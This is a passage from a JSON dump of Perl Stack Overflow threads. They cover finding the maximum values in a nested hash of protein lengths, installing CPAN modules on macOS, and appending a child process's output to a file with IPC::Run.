PCA).';\n$VAR3586 = {\n         'ACPS_GEOSL' =&gt; 126,\n         'ACP_GEOSL' =&gt; 77,\n         'ACKA_GEOSL' =&gt; 421,\n         'ACYP_GEOSL' =&gt; 91,\n         'ACCA_GEOSL' =&gt; 319\n       };\n$VAR3587 = 'Bactrocera dorsalis (Oriental fruit fly) (Dacus dorsalis).';\n$VAR3588 = {\n         'ACT3_BACDO' =&gt; 376,\n         'ACT5_BACDO' =&gt; 376,\n         'ACT1_BACDO' =&gt; 376,\n         'ACT2_BACDO' =&gt; 376\n       };\n$VAR3589 = 'Caenorhabditis elegans.';\n$VAR3590 = {\n         'ACH5_CAEEL' =&gt; 511,\n         '6PGD_CAEEL' =&gt; 484,\n         'ACM2_CAEEL' =&gt; 627,\n         'ACADM_CAEEL' =&gt; 417,\n         'ADAL_CAEEL' =&gt; 388,\n         'ACON_CAEEL' =&gt; 777,\n         'ACBP3_CAEEL' =&gt; 116,\n         '2AB1_CAEEL' =&gt; 495,\n         '3HIDH_CAEEL' =&gt; 299,\n         'ACH1_CAEEL' =&gt; 498,\n         '6PGL_CAEEL' =&gt; 269,\n         '2A51_CAEEL' =&gt; 542,\n         '2AAA_CAEEL' =&gt; 590,\n         'A16L2_CAEEL' =&gt; 534,\n         'ACH4_CAEEL' =&gt; 548,\n         'ACC2_CAEEL' =&gt; 445,\n         'ADA17_CAEEL' =&gt; 686,\n         'ACR5_CAEEL' =&gt; 598,\n         'ACTL1_CAEEL' =&gt; 360,\n         'ADBP1_CAEEL' =&gt; 217,\n         'ACH8_CAEEL' =&gt; 474,\n         '5NT3_CAEEL' =&gt; 376,\n         'ACT2_CAEEL' =&gt; 376,\n         'AAR2_CAEEL' =&gt; 357,\n         'ACH23_CAEEL' =&gt; 545,\n         'ACD11_CAEEL' =&gt; 617,\n         'ABF2_CAEEL' =&gt; 85,\n         'ABDH3_CAEEL' =&gt; 375,\n         'ABF1_CAEEL' =&gt; 85,\n         'ABH51_CAEEL' =&gt; 355,\n         'ACX15_CAEEL' =&gt; 659,\n         'ACC1_CAEEL' =&gt; 466,\n         'ABL1_CAEEL' =&gt; 1224,\n         'ACC3_CAEEL' =&gt; 517,\n         'ABH52_CAEEL' =&gt; 444,\n         'ACT4_CAEEL' =&gt; 376,\n         'ACH2_CAEEL' =&gt; 493,\n         'ACBP1_CAEEL' =&gt; 86,\n         '14332_CAEEL' =&gt; 248,\n         'ACR7_CAEEL' =&gt; 538,\n         'ACC4_CAEEL' =&gt; 408,\n         'ACE1_CAEEL' =&gt; 620,\n         'AATC_CAEEL' =&gt; 408,\n         'ACH6_CAEEL' =&gt; 502,\n         'ACH3_CAEEL' =&gt; 564,\n         'ACR3_CAEEL' =&gt; 487,\n         'ACMSD_CAEEL' =&gt; 401,\n         'ACH7_CAEEL' =&gt; 507,\n         'ACR2_CAEEL' =&gt; 575,\n         'ACASE_CAEEL' =&gt; 272,\n         'ACM3_CAEEL' =&gt; 611,\n         'AAPK2_CAEEL' =&gt; 626,\n         'ACN1_CAEEL' =&gt; 906,\n         '3HAO_CAEEL' =&gt; 281,\n         'ADAS_CAEEL' =&gt; 597,\n         'ACT1_CAEEL' =&gt; 376,\n         'A4_CAEEL' =&gt; 686,\n         'ADA10_CAEEL' =&gt; 922,\n         'A16L1_CAEEL' =&gt; 578,\n         'ACT3_CAEEL' =&gt; 376,\n         'ACP1_CAEEL' =&gt; 426,\n         'ACM1_CAEEL' =&gt; 713,\n         'AAPK1_CAEEL' =&gt; 589,\n         'ACOC_CAEEL' =&gt; 887,\n         'ACLY_CAEEL' =&gt; 1106,\n         '14331_CAEEL' =&gt; 248\n       };\n$VAR3591 = 'Anopheles stephensi (Indo-Pakistan malaria mosquito).';\n$VAR3592 = {\n         'ACES_ANOST' =&gt; 664\n       };\n$VAR3593 = 'Bacillus thuringiensis subsp. konkukian (strain 97-27).';\n$VAR3594 = {\n         'ACKA_BACHK' =&gt; 397,\n         'ACCD_BACHK' =&gt; 289,\n         'ACPS_BACHK' =&gt; 119,\n         '3MGH_BACHK' =&gt; 205,\n         'ACCA_BACHK' =&gt; 324,\n         'ACP_BACHK' =&gt; 77\n       };\n</code></pre>\n\n<p>More exactly, I wanto to know which organisms have more than 50 proteins Ids in my hash, and select them, getting rid of the other organisms with less number of proteins</p>\n"}, {"tags": ["perl", "sorting", "hash"], "answers": [{"tags": [], "owner": {"reputation": 11771, "user_id": 1275653, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cb781e5bd49c5d403228b98859d8b6dd?s=128&d=identicon&r=PG", "display_name": "thb", "link": "https://stackoverflow.com/users/1275653/thb"}, "is_accepted": false, "score": 1, "last_activity_date": 1574556159, "last_edit_date": 1574556159, "creation_date": 1574555736, "answer_id": 59013648, "question_id": 59013504, "link": "https://stackoverflow.com/questions/59013504/sort-multidimensional-hash-by-values-and-print-the-highest/59013648#59013648", "title": "Sort multidimensional hash by values and print the highest", "body": "<p>Sometimes the hardest thing to do is precisely to define the problem. Try this code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse integer;\n\nmy %info = (\n    Debian  =&gt; { jessie =&gt; 80, buster =&gt; 90, bullseye =&gt; 110 },\n    Fedora  =&gt; { fedora_a =&gt; 70, fedora_b =&gt; 105 },\n    Arch    =&gt; { arch_a =&gt; 50, arch_b =&gt; 108 },\n    Windows =&gt; { vista =&gt; 40, win10 =&gt; 63 },\n    OSX     =&gt; { apple =&gt; 71 },\n);\n\nmy @key_pairs_unsorted;\nfor my $os (keys %info) {\n    for my $id (keys %{$info{$os}}) {\n        push @key_pairs_unsorted, {os =&gt; $os, id =&gt; $id};\n    }\n}\nmy @key_pairs_sorted =\n  sort { $info{$b-&gt;{os}}{$b-&gt;{id}} &lt;=&gt; $info{$a-&gt;{os}}{$a-&gt;{id}} }\n  @key_pairs_unsorted;\n\nprintf \"%-7s %-8s %3d\\n\",\n  $_-&gt;{os}, $_-&gt;{id}, ${info}{$_-&gt;{os}}{$_-&gt;{id}}\n  for @key_pairs_sorted;\n</code></pre>\n\n<p>Understanding this code should help you precisely to define your problem, after which you should be able to solve the problem reasonably swiftly.</p>\n\n<p>For further reference, <a href=\"https://stackoverflow.com/q/762399/1275653\">this question</a> or <a href=\"https://stackoverflow.com/q/14943522/1275653\">this one</a> might be of interest.</p>\n"}, {"comments": [{"owner": {"reputation": 11771, "user_id": 1275653, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cb781e5bd49c5d403228b98859d8b6dd?s=128&d=identicon&r=PG", "display_name": "thb", "link": "https://stackoverflow.com/users/1275653/thb"}, "edited": false, "score": 0, "creation_date": 1574556433, "post_id": 59013693, "comment_id": 104274832, "body": "This is a good answer if OP does not actually need to sort. (He says that he needs to sort but it is reasonable to surmise that he might not need that.)"}], "tags": [], "owner": {"reputation": 120535, "user_id": 123109, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/157c96de3d125abc1c363ff25c20dfaf?s=128&d=identicon&r=PG", "display_name": "Greg Bacon", "link": "https://stackoverflow.com/users/123109/greg-bacon"}, "is_accepted": false, "score": 2, "last_activity_date": 1574556259, "creation_date": 1574556259, "answer_id": 59013693, "question_id": 59013504, "link": "https://stackoverflow.com/questions/59013504/sort-multidimensional-hash-by-values-and-print-the-highest/59013693#59013693", "title": "Sort multidimensional hash by values and print the highest", "body": "<pre><code>my($maxos,$maxid,$maxlength);\nforeach my $os (sort keys %info) {\n  foreach my $id (keys %{ $info{$os} }) {\n    ($maxos,$maxid,$maxlength) = ($os,$id,$info{$os}{$id})\n      if !defined $maxlength || $info{$os}{$id} &gt; $maxlength;\n  }\n}\n\nprint \"$maxos $maxid =&gt; $maxlength\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 5, "last_activity_date": 1574709185, "last_edit_date": 1574709185, "creation_date": 1574556840, "answer_id": 59013740, "question_id": 59013504, "link": "https://stackoverflow.com/questions/59013504/sort-multidimensional-hash-by-values-and-print-the-highest/59013740#59013740", "title": "Sort multidimensional hash by values and print the highest", "body": "<p>Can use <a href=\"https://perldoc.perl.org/List/Util.html#reduce\" rel=\"nofollow noreferrer\">List::Util::reduce</a> to get the key with the largest value, within each top-level key</p>\n\n<pre><code>use List::Util qw(reduce);\n\nfor my $os (keys %info) { \n    my $id_max_length = reduce { \n        $info{$os}{$a} &gt; $info{$os}{$b} ? $a : $b \n    } keys %{$info{$os}};\n\n    say \"$os --&gt; $id_max_length --&gt; $info{$os}{$id_max_length}\";\n}\n</code></pre>\n\n<hr>\n\n<p>To get the highest value among all keys </p>\n\n<pre><code>my ($max_os, $max_id) = \n    map { $_-&gt;[0], $_-&gt;[1] }\n    reduce { $info{$a-&gt;[0]}{$a-&gt;[1]} &gt; $info{$b-&gt;[0]}{$b-&gt;[1]} ? $a : $b }\n    map { [$_, max_id_for_os($_)] } \n    keys %info;\n\nsay \"$max_os -&gt; $max_id -&gt; $info{$max_os}{$max_id}\";\n\nsub max_id_for_os {\n    my ($os) = @_; \n    reduce { $info{$os}{$a} &gt; $info{$os}{$b} ? $a : $b } keys %{$info{$os}}\n}\n</code></pre>\n\n<p>Or, perhaps simpler, compare in the loop over top-level keys</p>\n\n<pre><code>my ($max_os, $max_id) = do {  # initialize\n    my ($os) = keys %info;\n    $os, (keys %{$info{$os}})[0];\n};\n\nfor my $os (keys %info) { \n    my $mid = \n        reduce { $info{$os}{$a} &gt; $info{$os}{$b} ? $a : $b } \n        keys %{$info{$os}};\n\n    ($max_os, $max_id) = ($os, $mid) \n        if $info{$os}{$mid} &gt; $info{$max_os}{$max_id};\n}\n\nsay \"Largest: $max_os -&gt; $max_id -&gt; $info{$max_os}{$max_id}\";\n</code></pre>\n"}], "owner": {"reputation": 509, "user_id": 6594286, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/10207751248792790/picture?type=large", "display_name": "Emilio M&#225;rmol S&#225;nchez", "link": "https://stackoverflow.com/users/6594286/emilio-m%c3%a1rmol-s%c3%a1nchez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 59013740, "answer_count": 3, "score": 4, "last_activity_date": 1574709185, "creation_date": 1574554259, "last_edit_date": 1574556339, "question_id": 59013504, "link": "https://stackoverflow.com/questions/59013504/sort-multidimensional-hash-by-values-and-print-the-highest", "title": "Sort multidimensional hash by values and print the highest", "body": "<p>I have a stored multidimensional hash (<code>%info</code>) with following structure:</p>\n\n<pre><code>$info{$os}{$id}=$length;\n\nforeach $os (keys %info){   \n    foreach $id (keys %{$info{$os}}){\n        print \"$os $id =&gt; \" . $info{$os}{$id} .\"\\n\" if (keys %info &gt; 100);\n    }\n}\n</code></pre>\n\n<p>With this, I can read the hash and print only those <code>$os</code> with more than 100 occurrences, but now I would like to print only the <code>$id</code> with highest $length (i.e., values). So I would like to sort the hash by values and print only <code>$os</code> and <code>$id</code> with highest value.</p>\n\n<p>Any help?</p>\n"}, {"tags": ["macos", "perl", "module", "cpan"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574553964, "post_id": 59013279, "comment_id": 104274395, "body": "It looks like it was installed in a non-standard directory (to avoid requiring root), but that Perl wasn&#39;t told to look there for modules. What&#39;s the output of <code>set | grep ^PERL; echo &#39;o conf&#39; | cpan</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574554544, "post_id": 59013279, "comment_id": 104274534, "body": "In short, I think <code>&#47;Users&#47;BNW&#47;perl5&#47;lib</code> needs to be added to env var <code>PERL5LIB</code>."}], "answers": [{"comments": [{"owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574557932, "post_id": 59013478, "comment_id": 104275051, "body": "What code would you need to see? I saved all the cpan output, 412 lines, and could post them."}, {"owner": {"reputation": 33, "user_id": 12323487, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mCHqQNH8eHCceIoyfhOEIWLoQQ3GnXN_NrXzO57=k-s128", "display_name": "JTS", "link": "https://stackoverflow.com/users/12323487/jts"}, "reply_to_user": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574607143, "post_id": 59013478, "comment_id": 104283779, "body": "probably  the first 12 lines."}], "tags": [], "owner": {"reputation": 33, "user_id": 12323487, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mCHqQNH8eHCceIoyfhOEIWLoQQ3GnXN_NrXzO57=k-s128", "display_name": "JTS", "link": "https://stackoverflow.com/users/12323487/jts"}, "is_accepted": false, "score": 0, "last_activity_date": 1574553992, "creation_date": 1574553992, "answer_id": 59013478, "question_id": 59013279, "link": "https://stackoverflow.com/questions/59013279/how-do-i-install-perl-modules-on-macos/59013478#59013478", "title": "how do I install perl modules on macos?", "body": "<p><a href=\"http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/\" rel=\"nofollow noreferrer\">http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/</a> gives an in-depth tutorial. As far as I can tell some CPAN Config lines may be needed however there is not enough code provided to say that is the cause of the issue. In any event here is the CPAN config code.</p>\n\n<pre><code>$ sudo perl -MCPAN -e shell\nperl&gt; o conf init\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "is_accepted": false, "score": 0, "last_activity_date": 1574626962, "creation_date": 1574626962, "answer_id": 59022020, "question_id": 59013279, "link": "https://stackoverflow.com/questions/59013279/how-do-i-install-perl-modules-on-macos/59022020#59022020", "title": "how do I install perl modules on macos?", "body": "<p>The solution is embedded in the solution at <a href=\"https://stackoverflow.com/questions/59011305/perl-how-can-i-append-stdout-of-list-form-system-call-of-perl-script-to-a-file\">perl how can I append STDOUT of list form system call of perl script to a file</a>. That question was answered in part by performing the desired installation of a module. Thanks to <a href=\"http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/\" rel=\"nofollow noreferrer\">http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 19, "user_id": 13053261, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AOh14GiZ7TTdF2vyxZqoKohG9jKa_LnRjqrqwt2lsaXB=k-s128", "display_name": "Baranidharan S", "link": "https://stackoverflow.com/users/13053261/baranidharan-s"}, "is_accepted": false, "score": 1, "last_activity_date": 1596753335, "last_edit_date": 1596753335, "creation_date": 1596699809, "answer_id": 63278992, "question_id": 59013279, "link": "https://stackoverflow.com/questions/59013279/how-do-i-install-perl-modules-on-macos/63278992#63278992", "title": "how do I install perl modules on macos?", "body": "<p>try the following :</p>\n<pre><code>sudo perl -MCPAN -e 'install -force Net::ARP'\n</code></pre>\n"}], "owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2428, "favorite_count": 0, "answer_count": 3, "score": 3, "last_activity_date": 1596753335, "creation_date": 1574552001, "question_id": 59013279, "link": "https://stackoverflow.com/questions/59013279/how-do-i-install-perl-modules-on-macos", "title": "how do I install perl modules on macos?", "body": "<p>The thread <a href=\"https://stackoverflow.com/questions/59011305/perl-how-can-i-append-stdout-of-list-form-system-call-of-perl-script-to-a-file\">perl how can I append STDOUT of list form system call of perl script to a file</a> led to the following solution: <code>use IPC::Run qw( run );</code>. On my macos 10.14.6 running perl 5.18.4, this threw an error: <code>Can't locate IPC/Run.pm in @INC (you may need to install the IPC::Run module)</code>. Accordingly, following <a href=\"https://stackoverflow.com/questions/65865/whats-the-easiest-way-to-install-a-missing-perl-module\">What&#39;s the easiest way to install a missing Perl module?</a>, I did </p>\n\n<pre><code>&gt; cpan IPC::Run\n&lt;snip: 403 lines later&gt;\nAppending installation info to /Users/BNW/perl5/lib/perl5/darwin-thread-multi-2level/perllocal.pod\n  TODDR/IPC-Run-20180523.0.tar.gz\n  /usr/bin/make install  -- OK\n</code></pre>\n\n<p>and rebooted my MacBookPro. And I edited my perl script, <code>bosswrap.pl</code>, to start</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings;\nuse IPC::Run qw( run );\n</code></pre>\n\n<p>but this again throws apparently the same error as before:</p>\n\n<pre><code>&gt; bosswrap.pl\nCan't locate IPC/Run.pm in @INC (you may need to install the IPC::Run module) (@INC contains: /sw/lib/perl5/darwin-thread-multi-2level /sw/lib/perl5 /sw/lib/perl5/darwin /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4 /System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\nBEGIN failed--compilation aborted at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\n</code></pre>\n\n<p>What am I doing wrong, or rather, how can I get this to work?</p>\n"}, {"tags": ["arrays", "perl", "stdout", "whitespace", "filehandle"], "comments": [{"owner": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1574540224, "post_id": 59011305, "comment_id": 104271366, "body": "<a href=\"https://perldoc.perl.org/perlfaq8.html#Why-can&#39;t-I-get-the-output-of-a-command-with-system&#40;&#41;%3f\" rel=\"nofollow noreferrer\">perldoc</a>"}], "answers": [{"comments": [{"owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574547973, "post_id": 59012054, "comment_id": 104273258, "body": "Attempted this without success and edited my question accordingly. I&#39;m on macos with perl 5.18.4."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574550634, "post_id": 59012054, "comment_id": 104273760, "body": "Any reason to believe the error message (&quot;<i>you may need to install the IPC::Run module</i>&quot;) is wrong?"}, {"owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574552544, "post_id": 59012054, "comment_id": 104274138, "body": "I would have no idea how to judge a perl-generated error or warning. I take it at its word. Now have posted <a href=\"https://stackoverflow.com/questions/59013279/how-do-i-install-perl-modules-on-macos\" title=\"how do i install perl modules on macos\">stackoverflow.com/questions/59013279/&hellip;</a>."}, {"owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "edited": false, "score": 0, "creation_date": 1574560869, "post_id": 59012054, "comment_id": 104275471, "body": "Followed <a href=\"http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/\" rel=\"nofollow noreferrer\">triopter.com/archive/&hellip;</a> ending with <code>sudo perl -MCPAN -e &#39;install IPC::Run&#39;</code> and <code>bosswrap.pl</code> no longer throws the <code>Can&#39;t locate IPC&#47;Run.pm</code> error."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1574542115, "last_edit_date": 1574542115, "creation_date": 1574541623, "answer_id": 59012054, "question_id": 59011305, "link": "https://stackoverflow.com/questions/59011305/perl-how-can-i-append-stdout-of-list-form-system-call-of-perl-script-to-a-file/59012054#59012054", "title": "perl how can I append STDOUT of list form system call of perl script to a file", "body": "<p><code>STDOUT</code> and Perl's default output handle (as set using <code>select</code>) are process-specific variables the OS knows nothing of. An executed program does not inherit these. It does inherit the parent's file descriptors, the underlying system handles.</p>\n\n<p>I would let <a href=\"http://search.cpan.org/perldoc?IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a> or <a href=\"http://search.cpan.org/perldoc?IPC::Run3\" rel=\"nofollow noreferrer\">IPC::Run3</a> do the hard work for me.</p>\n\n<pre><code>use IPC::Run qw( run );\n\nrun [ \"wrapped.pl\", @array ],\n   '&gt;&gt;', $fileresult;\n\ndie(\"wrapped.pl killed by signal \".( $? &amp; 0x7F ).\"\\n\") if $? &amp; 0x7F;\ndie(\"wrapped.pl exited with error \".( $? &gt;&gt; 8 ).\"\\n\") if $ ?&gt;&gt; 8;\n</code></pre>\n\n<p>It is also possible to do with low-level core module <a href=\"http://search.cpan.org/perldoc?IPC::Open3\" rel=\"nofollow noreferrer\">IPC::Open3</a></p>\n\n<pre><code>use IPC::Open3 qw( open3 );\n\nopen(local *CHILD_STDIN, '&lt;', '/dev/null')\n   or die(\"Can't open \\\"/dev/null\\\": $!\\n\");\nopen(local *CHILD_STDOUT, '&gt;&gt;', $fileresult)\n   or die(\"Can't append to \\\"$fileresult\\\": $!\\n\");\n\nmy $pid = open3('&lt;&amp;CHILD_STDIN', '&gt;&amp;CHILD_STDOUT', '&gt;&amp;STDERR',\n   \"wrapped.pl\", @array);\n\nwaitpid($pid, 0);\ndie(\"Can't execute wrapped.pl: $!\\n\") if $? == -1;\ndie(\"wrapped.pl killed by signal \".( $? &amp; 0x7F ).\"\\n\") if $? &amp; 0x7F;\ndie(\"wrapped.pl exited with error \".( $? &gt;&gt; 8 ).\"\\n\") if $ ?&gt;&gt; 8;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "is_accepted": false, "score": 1, "last_activity_date": 1574563288, "creation_date": 1574563288, "answer_id": 59014198, "question_id": 59011305, "link": "https://stackoverflow.com/questions/59011305/perl-how-can-i-append-stdout-of-list-form-system-call-of-perl-script-to-a-file/59014198#59014198", "title": "perl how can I append STDOUT of list form system call of perl script to a file", "body": "<p>After installing <code>IPC::Run</code> with the help of <a href=\"http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/\" rel=\"nofollow noreferrer\">http://triopter.com/archive/how-to-install-perl-modules-on-mac-os-x-in-4-easy-steps/</a>, the following solution from <a href=\"https://stackoverflow.com/users/589924/ikegami\">https://stackoverflow.com/users/589924/ikegami</a> worked:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings; \nuse IPC::Run qw( run );\nmy $fileresult = \"trash.txt\";\nunlink $fileresult; # rm any existing file\nmy @array = ( 5, \"don't you . . . \", \"\\x09\\x21\", \"\\x3f  \\x21\", \"\\x09*\\x09\" );\nmy $count=0;\nprint \"inside $0\\n\";\nfor my $element ( @array ) {\n    $count++;\n    print \"$count\\t|$element|\\n\";\n}\nrun [ \"wrapped.pl\", @array ], '&gt;&gt;', $fileresult;\ndie(\"wrapped.pl killed by signal \".( $? &amp; 0x7F ).\"\\n\") if $? &amp; 0x7F;\ndie(\"wrapped.pl exited with error \".( $? &gt;&gt; 8 ).\"\\n\") if $ ?&gt;&gt; 8;\nexit 0; \n</code></pre>\n"}], "owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 202, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1574563288, "creation_date": 1574536840, "last_edit_date": 1574551131, "question_id": 59011305, "link": "https://stackoverflow.com/questions/59011305/perl-how-can-i-append-stdout-of-list-form-system-call-of-perl-script-to-a-file", "title": "perl how can I append STDOUT of list form system call of perl script to a file", "body": "<p>My <code>bosswrap.pl</code> will generate arbitrary arrays containing whitespace in the elements. It repeatedly sends the array by a system call to <code>wrapped.pl</code>, which creates STDOUT based on the array. </p>\n\n<p>Subsequently, <code>bosswrap.pl</code> must append the STDOUT of <code>wrapped.pl</code> to a file which <code>bosswrap.pl</code> controls. That is where I am stuck. First <code>wrapped.pl</code>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings;\nprint \"inside $0\\n\";\nmy $countarrayelements=0;\nfor my $item ( @ARGV ) {\n        $countarrayelements++;\n        print \"$countarrayelements: |$item|\\n\"; \n    }\n</code></pre>\n\n<p>Then <code>bosswrap.pl</code>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings; \nmy $fileresult = \"trash.txt\";\nunlink $fileresult; # rm any existing file\nmy $handlefileresult; \nmy @array = ( 5, \"don't you . . . \", \"\\x09\\x21\", \"\\x3f  \\x21\" );\nmy $count=0;\nprint \"inside $0\\n\";\nfor my $element ( @array ) {\n    $count++;\n    print \"$count\\t|$element|\\n\";\n}\n\n#https://stackoverflow.com/questions/50553031/calling-a-shell-command-with-multiple-arguments\n#list form: command line arguments pass verbatim, avoid shell interpolation  \nsystem(\"wrapped.pl\", @array) == 0 or die \"system failed: \\$? = $?\";\n\n#This block sends the return code, not the STDOUT, to handlefileresult\nopen( $handlefileresult, \"&gt;&gt; \", $fileresult) || die \"$0: can't open $fileresult for appending$!\";\nprint $handlefileresult \"not a system call\\n\";\nprint {$handlefileresult} system(\"wrapped.pl\", @array) == 0 or die \"system failed: \\$? = $?\";\nclose ( $handlefileresult ) || die;\n\n#In the following block, select unfortunately will not redirect output of system call:\nopen( $handlefileresult, \"&gt;&gt; \", $fileresult) || die \"$0: can't open $fileresult for appending$!\";\nselect $handlefileresult; \nprint \"selected; BEFORE system call\\n\";\nsystem(\"wrapped.pl\", @array) == 0 or die \"system failed: \\$? = $?\";\nprint \"selected; AFTER system call\\n\";\nclose ( $handlefileresult ) || die;\n</code></pre>\n\n<p>Again, I want to repeatedly call <code>wrapped.pl</code> from inside <code>bosswrap.pl</code> and put the output of these system calls into <code>$fileresult</code>.</p>\n\n<p>One reply @ikegami suggested <code>use IPC::Run qw( run );</code> but that throws an error. I run perl on macos. What has to be done to get this to work?</p>\n\n<pre><code>&gt; perl --version\n\nThis is perl 5, version 18, subversion 4 (v5.18.4) built for darwin-thread-multi-2level\n(with 2 registered patches, see perl -V for more detail)\n\nCopyright 1987-2013, Larry Wall\n\nPerl may be copied only under the terms of either the Artistic License or the\nGNU General Public License, which may be found in the Perl 5 source kit.\n\nComplete documentation for Perl, including FAQ lists, should be found on\nthis system using \"man perl\" or \"perldoc perl\".  If you have access to the\nInternet, point your browser at http://www.perl.org/, the Perl Home Page.\n\n&gt; bosswrap.pl\nCan't locate IPC/Run.pm in @INC (you may need to install the IPC::Run module) (@INC contains: /sw/lib/perl5/darwin-thread-multi-2level /sw/lib/perl5 /sw/lib/perl5/darwin /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4 